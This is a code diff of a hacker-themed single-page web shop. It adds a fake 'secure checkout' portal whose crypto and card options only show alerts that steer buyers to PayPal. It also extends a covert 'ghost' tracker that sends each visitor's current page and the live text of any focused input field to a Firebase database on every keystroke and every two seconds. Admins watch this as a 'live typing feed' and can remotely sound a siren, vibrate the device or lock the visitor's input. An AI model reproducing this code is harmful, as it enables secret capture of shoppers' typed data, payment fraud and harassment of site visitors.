@@ -135,6 +135,26 @@
         .intel-ticker-wrap { position: fixed; bottom: 0; left: 0; width: 100%; height: 45px; background: rgba(0,0,0,0.9); border-top: 2px solid var(--primary); z-index: 9999; display: flex; align-items: center; }
         .intel-ticker-label { background: var(--primary); color: #000; font-weight: bold; padding: 0 15px; height: 100%; display: flex; align-items: center; }
         
+        /* PAGE 3: PAYMENT PORTAL STYLES */
+        .pay-method-card {
+            background: linear-gradient(145deg, #1a1a1a, #000);
+            border: 1px solid var(--primary);
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transition: 0.3s;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+        }
+        .pay-method-card:hover { transform: scale(1.02); border-color: #fff; box-shadow: 0 0 20px var(--primary); }
+        .pay-icon { font-size: 30px; margin-right: 15px; }
+        .pay-text { text-align: left; flex: 1; }
+        .pay-text b { color: var(--primary); font-size: 18px; }
+        .pay-text p { margin: 2px 0 0 0; font-size: 11px; color: #888; }
+
         @media (max-width: 768px) {
             header { font-size: 30px; letter-spacing: 4px; padding: 20px 0; }
             .header-container { padding: 30px 0; }
@@ -226,7 +246,44 @@
         <input type="text" id="apply-coupon" placeholder="COUPON_CODE">
         <button onclick="applyCoupon()" class="ui-btn" style="width:100%; margin-top:10px;">VALIDATE CODE</button>
         <h1 id="total-usd" style="color:var(--price-gold)">TOTAL: $0</h1>
-        <button onclick="triggerHackerPay()" style="width:100%; background:var(--primary); color:black; padding:20px; font-weight:bold; border:none; cursor:pointer; font-size:18px;">⚔️ FINISH PURCHASE</button>
+        <button onclick="showPaymentPortal()" style="width:100%; background:var(--primary); color:black; padding:20px; font-weight:bold; border:none; cursor:pointer; font-size:18px;">⚔️ FINISH PURCHASE</button>
+    </div>
+</div>
+
+<div id="payment-portal-page" style="display:none; padding:50px;">
+    <div style="max-width:500px; margin:0 auto; background:rgba(10,10,10,0.95); border:2px solid var(--primary); padding:30px; border-radius:20px; box-shadow: 0 0 50px rgba(255, 215, 0, 0.2);">
+        <h2 style="color:var(--primary); letter-spacing:3px; margin-bottom:5px;">SECURE CHECKOUT</h2>
+        <p id="portal-total" style="color:var(--price-gold); font-size:24px; font-weight:bold; margin-bottom:25px;">$0.00</p>
+        
+        <div class="pay-method-card" onclick="triggerHackerPay()">
+            <div class="pay-icon">🔵</div>
+            <div class="pay-text">
+                <b>PAYPAL / CARD</b>
+                <p>Instant activation via Secure Gateway</p>
+            </div>
+            <div style="color:var(--primary)">➔</div>
+        </div>
+
+        <div class="pay-method-card" onclick="alert('CRYPTO NODE CONNECTING... CONTACT ADMIN')">
+            <div class="pay-icon">₿</div>
+            <div class="pay-text">
+                <b>CRYPTOCURRENCY</b>
+                <p>BTC / LTC / ETH - 10% Extra Discount</p>
+            </div>
+            <div style="color:var(--primary)">➔</div>
+        </div>
+
+        <div class="pay-method-card" onclick="alert('CREDIT SYSTEM OFFLINE. USE PAYPAL')">
+            <div class="pay-icon">💳</div>
+            <div class="pay-text">
+                <b>CREDIT / DEBIT</b>
+                <p>Direct encrypted card processing</p>
+            </div>
+            <div style="color:var(--primary)">➔</div>
+        </div>
+
+        <button onclick="showCheckout()" class="ui-btn" style="width:100%; margin-top:20px; background:transparent; color:red; border:1px solid red;">❌ CANCEL & GO BACK</button>
+        <p style="font-size:9px; color:#444; margin-top:15px;">ENCRYPTION: AES-256 | NODE: R4-SECURE</p>
     </div>
 </div>
 
@@ -393,9 +450,6 @@ function targetUser(targetID) {
     if(document.getElementById('chat-widget').style.display !== 'flex') toggleChat(); 
 }
 
-// ==========================================
-// FIXED GHOST MONITOR LOGIC (DIRECT SYNC)
-// ==========================================
 function openGhostView(targetID) {
     const gW = window.open('', '_blank', 'width=450,height=500');
     gW.document.write(`
@@ -404,15 +458,15 @@ function openGhostView(targetID) {
             <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"><\/script>
             <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"><\/script>
         </head>
-        <body style="background:#050505; color:#0f0; font-family:monospace; padding:20px; overflow-x:hidden;">
-            <h2 style="color:yellow; border-bottom:1px solid #333; padding-bottom:10px;">GHOST MONITOR: User_${targetID}</h2>
+        <body style="background:#050505; color:#0f0; font-family:monospace; padding:20px;">
+            <h2 style="color:yellow; border-bottom:1px solid #333;">GHOST MONITOR: User_${targetID}</h2>
             <div id="status" style="margin-top:20px;">
                 <p>STATUS: <span id="conn-state" style="color:red;">CONNECTING...</span></p>
-                <p>CURRENT PAGE: <span id="p" style="color:white; font-weight:bold;">-</span></p>
+                <p>CURRENT PAGE: <span id="p" style="color:white;">-</span></p>
                 <p>LAST ACTIVE: <span id="a" style="color:white;">-</span></p>
-                <div style="background:#111; padding:15px; border:1px solid #333; margin-top:20px; border-radius:5px;">
-                    <p style="color:yellow; margin:0 0 10px 0; font-size:12px; border-bottom:1px solid #222;">LIVE TYPING FEED:</p>
-                    <div id="t" style="color:white; font-size:18px; word-break: break-all; min-height:40px;">...</div>
+                <div style="background:#111; padding:15px; border:1px solid #333; margin-top:20px;">
+                    <p style="color:yellow; margin:0 0 10px 0;">LIVE TYPING FEED:</p>
+                    <div id="t" style="color:white; font-size:18px; word-break: break-all;">...</div>
                 </div>
             </div>
             <script>
@@ -424,15 +478,10 @@ function openGhostView(targetID) {
                 };
                 firebase.initializeApp(config);
                 const gDB = firebase.database();
-                
-                gDB.ref('.info/connected').on('value', s => {
-                    if(s.val()) document.getElementById('conn-state').innerText = "ACTIVE BRIDGE";
-                });
-
                 gDB.ref('ghost_tracking/${targetID}').on('value', s => {
                     const d = s.val();
                     if(d) {
-                        document.getElementById('p').innerText = d.pageName || "BROWSING";
+                        document.getElementById('p').innerText = d.pageName || "Unknown";
                         document.getElementById('a').innerText = new Date(d.lastActive).toLocaleTimeString();
                         document.getElementById('t').innerText = d.typing || "Not typing...";
                     }
@@ -453,34 +502,36 @@ async function getIdentity() {
         userID = userIP.split('.')[0];
         db.ref('presence/' + userID).set(true);
         db.ref('presence/' + userID).onDisconnect().remove();
-        if(!isAdmin) {
-            syncChat();
-            broadcastGhostData();
-        }
+        if(!isAdmin) { syncChat(); broadcastGhostData(); }
     } catch(e) { console.log("Identity Error"); }
 }
 
-// ==========================================
-// FIXED GHOST BROADCASTER (HEARTBEAT)
-// ==========================================
 function broadcastGhostData() {
     if(isAdmin || userID === "Unknown") return;
     const isCheckout = document.getElementById('checkout-page').style.display !== 'none';
     const isInfo = document.getElementById('info-page').style.display !== 'none';
+    const isPortal = document.getElementById('payment-portal-page').style.display !== 'none';
     let currentPage = "MAIN SHOP";
     if(isCheckout) currentPage = "CHECKOUT PAGE";
+    if(isPortal) currentPage = "PAYMENT SELECTION";
     if(isInfo) currentPage = "PRODUCT INFO: " + (document.getElementById('info-title').innerText || "");
     
     let typingContent = "";
     if(document.activeElement && (document.activeElement.tagName === "INPUT" || document.activeElement.tagName === "TEXTAREA")) {
         typingContent = document.activeElement.value;
     }
+    db.ref(`ghost_tracking/${userID}`).update({ pageName: currentPage, lastActive: Date.now(), typing: typingContent || "Browsing..." });
+}
 
-    db.ref(`ghost_tracking/${userID}`).update({
-        pageName: currentPage,
-        lastActive: Date.now(),
-        typing: typingContent || "Browsing..."
-    });
+function showPaymentPortal() {
+    if(cart.length === 0) return alert("INVENTORY EMPTY");
+    document.getElementById('checkout-page').style.display = 'none';
+    document.getElementById('payment-portal-page').style.display = 'block';
+    
+    let t=0; cart.forEach(i=>t+=parseFloat(i.price));
+    let final = (t - (t * (discount/100))).toFixed(2);
+    document.getElementById('portal-total').innerText = "DUE: $" + final;
+    broadcastGhostData();
 }
 
 function toggleMusic(e) { 
@@ -550,7 +601,14 @@ function addToCart(i) {
 function updateCartCount() { document.getElementById('cart-count').innerText = cart.length; }
 function clearCart() { cart = []; updateCartCount(); renderCart(); }
 function removeFromCart(i) { cart.splice(i, 1); updateCartCount(); renderCart(); }
-function showCheckout() { document.getElementById('shop-page').style.display='none'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='block'; renderCart(); broadcastGhostData(); }
+function showCheckout() { 
+    document.getElementById('shop-page').style.display='none'; 
+    document.getElementById('info-page').style.display='none'; 
+    document.getElementById('payment-portal-page').style.display='none';
+    document.getElementById('checkout-page').style.display='block'; 
+    renderCart(); 
+    broadcastGhostData(); 
+}
 
 function renderCart() {
     let l=document.getElementById('cart-list'), t=0; l.innerHTML = "";
@@ -563,7 +621,6 @@ function renderCart() {
 }
 
 function triggerHackerPay() {
-    if(cart.length === 0) return alert("INVENTORY EMPTY");
     document.getElementById('auth-overlay').style.display = 'flex';
     document.getElementById('paypal-button-container').innerHTML = '';
     let t=0; cart.forEach(i=>t+=parseFloat(i.price));
@@ -582,7 +639,6 @@ function login() {
         isAdmin = true;
         document.getElementById('admin-controls').style.display = 'grid';
         document.getElementById('login-section').style.display = 'none';
-        
         db.ref('intel').limitToLast(50).on('value', s => { 
             const val = s.val() || {};
             document.getElementById('pay-attempts-list').innerHTML = Object.keys(val).reverse().map(k => {
@@ -591,8 +647,8 @@ function login() {
                 return `<div style="margin-bottom:8px; border-bottom:1px solid #333; padding-bottom:5px;">
                             <span style="color:yellow; font-size:10px;">User_${extID}: ${txt}</span>
                             <div style="display:flex; gap:5px; margin-top:3px;">
-                                <button onclick="targetUser('${extID}')" style="background:#0044ff; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer; border-radius:3px;">BRIDGE</button>
-                                <button onclick="openGhostView('${extID}')" style="background:#008800; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer; border-radius:3px;">GHOST</button>
+                                <button onclick="targetUser('${extID}')" style="background:#0044ff; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer;">BRIDGE</button>
+                                <button onclick="openGhostView('${extID}')" style="background:#008800; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer;">GHOST</button>
                             </div>
                         </div>`;
             }).join(''); 
@@ -648,7 +704,14 @@ function showInfo(i) {
     broadcastGhostData();
 }
 
-function showShop() { document.getElementById('shop-page').style.display='block'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='none'; broadcastGhostData(); }
+function showShop() { 
+    document.getElementById('shop-page').style.display='block'; 
+    document.getElementById('info-page').style.display='none'; 
+    document.getElementById('checkout-page').style.display='none'; 
+    document.getElementById('payment-portal-page').style.display='none';
+    broadcastGhostData(); 
+}
+
 function applyCoupon() { const c = document.getElementById('apply-coupon').value.toUpperCase(); if(coupons[c]) { discount = coupons[c]; renderCart(); alert("APPLIED " + discount + "% DISCOUNT"); } else { alert("INVALID CODE"); } }
 
 const canvas = document.getElementById('global-canvas'); const ctx = canvas.getContext('2d'); let drops = [];
@@ -670,10 +733,7 @@ window.onload = () => {
     db.ref('presence').on('value', s => { if(document.getElementById('ghost-count')) document.getElementById('ghost-count').innerText = s.val() ? Object.keys(s.val()).length : 0; });
 
     db.ref('settings/site_status').on('value', s => {
-        if(s.val() === "LOCKED" && !isAdmin) {
-            document.body.innerHTML = "<h1 style='color:red; margin-top:20%'>403: SYSTEM LOCKED</h1><p>Admin is performing maintenance.</p>";
-            window.stop();
-        }
+        if(s.val() === "LOCKED" && !isAdmin) { document.body.innerHTML = "<h1 style='color:red; margin-top:20%'>403: SYSTEM LOCKED</h1>"; window.stop(); }
     });
 
     db.ref(`private_chats/${userID}/alert`).on('value', s => {
@@ -681,23 +741,12 @@ window.onload = () => {
     });
 
     db.ref(`private_chats/${userID}/power`).on('value', s => {
-        const p = s.val();
-        if(!p) return;
+        const p = s.val(); if(!p) return;
         try {
-            if(p.type === 'siren') { 
-                const sfx = document.getElementById('siren-sound');
-                sfx.volume = 1.0;
-                sfx.play().catch(() => { alert("⚠️ SYNCING SECURITY BRIDGE..."); sfx.play(); }); 
-            }
-            if(p.type === 'vibrate') { if('vibrate' in navigator) navigator.vibrate([1000, 500, 1000]); }
-            if(p.type === 'lock') { 
-                document.getElementById('input-lock-overlay').style.display = 'block'; 
-                document.body.style.filter = 'grayscale(1) contrast(0.8)';
-            }
-            if(p.type === 'unlock') { 
-                document.getElementById('input-lock-overlay').style.display = 'none'; 
-                document.body.style.filter = 'none';
-            }
+            if(p.type === 'siren') document.getElementById('siren-sound').play();
+            if(p.type === 'vibrate' && 'vibrate' in navigator) navigator.vibrate([1000, 500, 1000]);
+            if(p.type === 'lock') document.getElementById('input-lock-overlay').style.display = 'block';
+            if(p.type === 'unlock') document.getElementById('input-lock-overlay').style.display = 'none';
         } catch(e) {}
         setTimeout(() => db.ref(`private_chats/${userID}/power`).remove(), 2000);
     });
@@ -707,23 +756,11 @@ window.onload = () => {
         if(s.val()) { banner.innerText = "⚠️ SYSTEM: " + s.val(); banner.style.display = 'block'; } else { banner.style.display = 'none'; }
     });
 
-    db.ref('settings/feed_label').on('value', s => { document.getElementById('live-feed-label').innerText = s.val() || "LIVE_FEED"; });
-    db.ref('settings/feed_text').on('value', s => { document.getElementById('feed-text').innerText = s.val() || ">>> R4 FUSION SYSTEM STABLE :: ENCRYPTION ACTIVE..."; });
-
-    db.ref('settings/glitch_signal').on('value', s => {
-        if(!s.val()) return;
-        document.body.classList.add('glitching');
-        setTimeout(() => document.body.classList.remove('glitching'), 2000);
-    });
-
     db.ref('settings/global_ui').on('value', s => {
         const data = s.val();
         if(data) {
             if(data.primary_color) document.documentElement.style.setProperty('--primary', data.primary_color);
             if(data.shop_title) document.getElementById('main-header-text').innerText = data.shop_title;
-            if(data.matrix_speed) updateMatrixSpeed(parseInt(data.matrix_speed));
-            if(data.glow_active === "on") document.body.classList.add('neon-glow'); else document.body.classList.remove('neon-glow');
-            if(data.font_choice) document.body.style.fontFamily = data.font_choice;
         }
     });
 
@@ -732,10 +769,9 @@ window.onload = () => {
         if(e.key === "PageUp") { e.preventDefault(); document.getElementById('pgup-menu').style.display = 'block'; }
     });
 
-    // CRITICAL: UPDATED BROADCAST LISTENERS
     window.addEventListener('mousedown', () => broadcastGhostData());
     window.addEventListener('keyup', () => broadcastGhostData());
-    setInterval(broadcastGhostData, 2000); // AUTO-HEARTBEAT EVERY 2S
+    setInterval(broadcastGhostData, 2000);
 
     const logs = document.getElementById('load-logs'), lines = ["> BOOTING R4...", "> SYNCING DATABASE...", "> READY."];
     let step = 0;
@@ -744,10 +780,7 @@ window.onload = () => {
             logs.innerHTML += `<div>${lines[step]}</div>`;
             document.getElementById('load-bar').style.width = ((step+1)*33) + "%";
             step++;
-        } else {
-            clearInterval(loadInt);
-            setTimeout(() => document.getElementById('loader-overlay').style.display='none', 800);
-        }
+        } else { clearInterval(loadInt); setTimeout(() => document.getElementById('loader-overlay').style.display='none', 800); }
     }, 600);
 };
 
@@ -761,10 +794,7 @@ function applyGlobalChanges() {
         glow_active: document.getElementById('ui-glow').value,
         font_choice: document.getElementById('ui-font').value
     };
-    db.ref('settings/global_ui').set(uiData).then(() => {
-        document.getElementById('pgup-menu').style.display = 'none';
-        alert("GLOBAL UPDATE DEPLOYED");
-    });
+    db.ref('settings/global_ui').set(uiData).then(() => { document.getElementById('pgup-menu').style.display = 'none'; alert("GLOBAL UPDATE DEPLOYED"); });
 }
 
 function startAudio() { if(!musicStarted) { document.getElementById('hacker-music').play().catch(()=>{}); musicStarted = true; } }
